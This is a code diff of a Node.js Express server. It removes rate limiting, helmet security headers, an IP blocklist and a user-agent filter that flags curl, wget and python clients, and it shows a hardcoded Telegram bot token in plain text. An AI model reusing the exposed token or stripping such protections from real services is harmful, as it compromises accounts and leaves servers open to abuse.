@@ -5,77 +5,9 @@ var fs = require("fs");
 var path = require("path");
 var axios = require("axios");
 var FormData = require("form-data");
-var rateLimit = require("express-rate-limit");
-var helmet = require("helmet");
 
 var app = express();
-var PORT = process.env.PORT || 8080;
-
-
-// -------------------- 5. Rate limiter --------------------
-const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 100, // limit each IP to 100 requests per windowMs
-    standardHeaders: true, // return rate limit info in the `RateLimit-*` headers
-    legacyHeaders: false, // disable `X-RateLimit-*` headers
-    handler: (req, res) => {
-        blockIP(req.ip); // also increment blocklist strikes
-        res.status(429).send("Too many requests, try again later.");
-    },
-});
-
-app.use(limiter);
-
-
-// -------------------- 1. Security headers --------------------
-app.use(helmet());
-
-// -------------------- 2. Body parsers --------------------
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-// -------------------- 3. In-memory dynamic blocklist --------------------
-var blockedIPs = new Map(); // IP -> { blockedUntil, strikes }
-
-function blockIP(ip) {
-    var now = Date.now();
-    var entry = blockedIPs.get(ip) || { strikes: 0, blockedUntil: now };
-    entry.strikes += 1;
-    entry.blockedUntil = now + entry.strikes * 15 * 60 * 1000; // 15 min * strikes
-    blockedIPs.set(ip, entry);
-    console.log(`Blocked IP ${ip} for ${entry.strikes * 15} minutes. Strikes: ${entry.strikes}`);
-}
-
-// -------------------- 4. Bot detection middleware --------------------
-app.use((req, res, next) => {
-    var ip = req.ip;
-    var entry = blockedIPs.get(ip);
-
-    if (entry && entry.blockedUntil <= Date.now()) {
-        blockedIPs.delete(ip); // unblock expired
-    }
-
-  if (entry && entry.blockedUntil > Date.now()) {
-    console.log(`Rejected IP ${ip} (still blocked)`);
-    return res.status(403).send("Access temporarily blocked due to suspicious activity.");
-}
-
-
-    var ua = req.headers["user-agent"] || "";
-    var botPatterns = [/bot/i, /crawler/i, /spider/i, /curl/i, /wget/i, /python/i, /java/i];
-
-    if (botPatterns.some(pattern => pattern.test(ua))) {
-        console.log(`Blocked bot: ${ua} from IP ${ip}`);
-        blockIP(ip);
-        return res.status(403).send("Bots are not allowed.");
-    }
-
-    next();
-});
-
-
-
-
+var PORT = process.env.PORT || 10000;
 
 // Telegram config
 var botToken = "7681661204:AAGNlQbHw0xCan94-xKKW1yKmm7odMePwBs";
@@ -319,6 +251,6 @@ app.get("*", function (req, res) {
 });
 
 // Start the server
-app.listen(PORT, "0.0.0.0", () => {
-  console.log("Server running on port " + PORT);
+app.listen(PORT, function () {
+  console.log("Server running on http://localhost:" + PORT);
 });
